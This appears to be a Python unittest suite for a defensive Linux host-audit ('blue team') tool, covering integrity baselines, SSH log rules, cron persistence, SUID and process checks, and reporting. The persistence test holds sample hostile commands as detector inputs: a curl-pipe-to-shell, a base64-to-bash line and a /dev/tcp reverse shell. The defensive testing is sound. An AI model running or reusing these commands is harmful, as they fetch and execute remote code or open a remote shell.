"""Тесты blue-team модуля (unittest, без внешних зависимостей)."""

from __future__ import annotations

import json
import os
import sys
import tempfile
import unittest

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from blueteam.core import CheckResult, CheckStatus, Finding, Severity  # noqa: E402
from blueteam.modules import ALL_CHECKS, DESCRIPTIONS, REGISTRY  # noqa: E402
from blueteam.modules import integrity, logs, persistence, processes, suid, users  # noqa: E402
from blueteam.report import build_report  # noqa: E402


class TestCore(unittest.TestCase):
    def test_severity_ordering(self):
        self.assertGreater(Severity.CRITICAL, Severity.HIGH)
        self.assertGreater(Severity.HIGH, Severity.MEDIUM)
        self.assertGreater(Severity.MEDIUM, Severity.LOW)
        self.assertGreater(Severity.LOW, Severity.INFO)

    def test_checkresult_helpers(self):
        r = CheckResult(name="demo")
        r.info("i")
        r.low("l")
        r.high("h")
        self.assertEqual(len(r.findings), 3)
        self.assertEqual(r.highest_severity, Severity.HIGH)
        self.assertEqual(r.counts["HIGH"], 1)
        self.assertEqual(r.counts["LOW"], 1)
        self.assertEqual(r.counts["INFO"], 1)

    def test_checkresult_serialization(self):
        r = CheckResult(name="demo")
        r.critical("bad", "details", "fix it")
        d = r.to_dict()
        self.assertEqual(d["name"], "demo")
        self.assertEqual(d["findings"][0]["severity"], "CRITICAL")
        self.assertEqual(d["findings"][0]["recommendation"], "fix it")
        json.dumps(d)  # сериализуемо

    def test_finding_defaults(self):
        f = Finding("t")
        self.assertEqual(f.severity, Severity.INFO)
        self.assertEqual(f.data, {})


class TestRegistry(unittest.TestCase):
    def test_registry_matches_descriptions(self):
        self.assertEqual(set(REGISTRY), set(DESCRIPTIONS))
        self.assertEqual(set(ALL_CHECKS), set(REGISTRY))

    def test_all_checks_are_callable(self):
        for name, fn in REGISTRY.items():
            self.assertTrue(callable(fn), name)

    def test_every_check_returns_checkresult(self):
        for name, fn in REGISTRY.items():
            result = fn()
            self.assertIsInstance(result, CheckResult, name)
            self.assertEqual(result.name, name)
            self.assertIsInstance(result.findings, list)


class TestIntegrity(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        self.addCleanup(self.tmp.cleanup)
        self.file = os.path.join(self.tmp.name, "target.txt")
        with open(self.file, "w", encoding="utf-8") as fh:
            fh.write("original")

    def _patch_baseline(self):
        self._orig_path = integrity.BASELINE_PATH
        self._orig_dir = integrity.STATE_DIR
        integrity.STATE_DIR = self.tmp.name
        integrity.BASELINE_PATH = os.path.join(self.tmp.name, "baseline.json")
        self.addCleanup(self._restore)

    def _restore(self):
        integrity.BASELINE_PATH = self._orig_path
        integrity.STATE_DIR = self._orig_dir

    def test_init_creates_baseline(self):
        self._patch_baseline()
        r = integrity.run(init=True, targets=[self.file])
        self.assertTrue(os.path.exists(integrity.BASELINE_PATH))
        self.assertIn("baseline создан", r.summary)

    def test_detects_change(self):
        self._patch_baseline()
        integrity.run(init=True, targets=[self.file])
        with open(self.file, "w", encoding="utf-8") as fh:
            fh.write("tampered")
        r = integrity.run(targets=[self.file])
        self.assertEqual(r.meta["changed"], 1)
        self.assertGreaterEqual(r.highest_severity, Severity.MEDIUM)

    def test_detects_removal(self):
        self._patch_baseline()
        integrity.run(init=True, targets=[self.file])
        os.remove(self.file)
        r = integrity.run(targets=[self.file])
        self.assertEqual(r.meta["removed"], 1)

    def test_no_baseline_warns(self):
        self._patch_baseline()
        r = integrity.run(targets=[self.file])
        self.assertIn("baseline", r.summary.lower())


class TestLogs(unittest.TestCase):
    def test_rules_detect_bruteforce(self):
        with tempfile.NamedTemporaryFile("w", suffix=".log", delete=False, encoding="utf-8") as fh:
            for i in range(12):
                fh.write(
                    f"Oct 11 10:00:{i:02d} host sshd[1]: Failed password for root "
                    f"from 10.0.0.{i} port 22 ssh2\n"
                )
            fh.write("Oct 11 10:01:00 host sshd[2]: Accepted password for root from 10.0.0.9 port 22 ssh2\n")
            path = fh.name
        self.addCleanup(os.remove, path)
        r = logs.run(path=path)
        titles = " ".join(f.title for f in r.findings)
        self.assertIn("неудачные попытки", titles)
        self.assertIn("вход root", titles)

    def test_since_parser(self):
        self.assertIsNotNone(logs._since_epoch("5 minutes ago"))
        self.assertIsNotNone(logs._since_epoch("2 hours ago"))
        self.assertIsNone(logs._since_epoch("not a time"))
        self.assertIsNone(logs._since_epoch(None))


class TestPersistence(unittest.TestCase):
    def test_suspicious_patterns(self):
        self.assertTrue(persistence._is_suspicious("curl http://evil.sh | sh"))
        self.assertTrue(persistence._is_suspicious("echo aGVsbG8= | base64 -d | bash"))
        self.assertTrue(persistence._is_suspicious("bash -i >& /dev/tcp/1.2.3.4/4444 0>&1"))
        self.assertFalse(persistence._is_suspicious("0 3 * * * /usr/bin/apt-get update"))

    def test_scan_cron_returns_list(self):
        entries = persistence._scan_cron()
        self.assertIsInstance(entries, list)
        for e in entries:
            self.assertIn("source", e)
            self.assertIn("line", e)



class TestSuidHelpers(unittest.TestCase):
    def test_known_suid_realpath(self):
        known = suid.KNOWN_SUID
        self.assertIn("/usr/bin/sudo", known)
        self.assertIn("/usr/bin/passwd", known)

    def test_walk_skips_proc(self):
        found = list(suid._walk(["/proc"], max_entries=10))
        self.assertEqual(found, [])


class TestProcessesScoring(unittest.TestCase):
    def test_score_returns_tuple(self):
        score, reasons = processes.score_process(os.getpid(), {})
        self.assertIsInstance(score, int)
        self.assertIsInstance(reasons, list)

    def test_deleted_binary_scores_high(self):
        orig = processes._exe
        processes._exe = lambda pid: "/tmp/x (deleted)"
        try:
            score, reasons = processes.score_process(os.getpid(), {})
        finally:
            processes._exe = orig
        self.assertGreaterEqual(score, 40)
        self.assertTrue(any("удалён" in r for r in reasons))

    def test_severity_mapping(self):
        self.assertEqual(processes._severity_for(0), Severity.INFO)
        self.assertEqual(processes._severity_for(30), Severity.MEDIUM)
        self.assertEqual(processes._severity_for(50), Severity.HIGH)
        self.assertEqual(processes._severity_for(90), Severity.CRITICAL)

    def test_collect_processes(self):
        procs = processes.collect_processes()
        self.assertTrue(procs)
        for p in procs:
            self.assertIn("pid", p)
            self.assertIn("cmdline", p)


class TestUsers(unittest.TestCase):
    def test_parse_passwd(self):
        parsed = users._parse_passwd()
        self.assertTrue(parsed)
        for u in parsed:
            self.assertIn("name", u)
            self.assertIn("uid", u)

    def test_to_int(self):
        self.assertEqual(users._to_int("1000"), 1000)
        self.assertEqual(users._to_int("abc"), -1)

    def test_nologin_shells_present(self):
        self.assertIn("/usr/sbin/nologin", users.NOLOGIN_SHELLS)
        self.assertIn("/bin/false", users.NOLOGIN_SHELLS)


class TestReport(unittest.TestCase):
    def _sample(self):
        r1 = CheckResult(name="a")
        r1.high("high finding", "details", "fix")
        r2 = CheckResult(name="b", status=CheckStatus.SKIPPED, error="nope")
        return [r1, r2]

    def test_markdown_contains_sections(self):
        md = build_report(self._sample(), "markdown")
        self.assertIn("# BANU Blue Team", md)
        self.assertIn("## Сводка", md)
        self.assertIn("## a", md)
        self.assertIn("HIGH", md)
        self.assertIn("fix", md)

    def test_json_roundtrip(self):
        data = json.loads(build_report(self._sample(), "json"))
        self.assertEqual(len(data["checks"]), 2)
        self.assertEqual(data["totals"]["HIGH"], 1)

    def test_empty_report(self):
        md = build_report([], "markdown")
        self.assertIn("Сводка", md)


if __name__ == "__main__":
    unittest.main(verbosity=2)

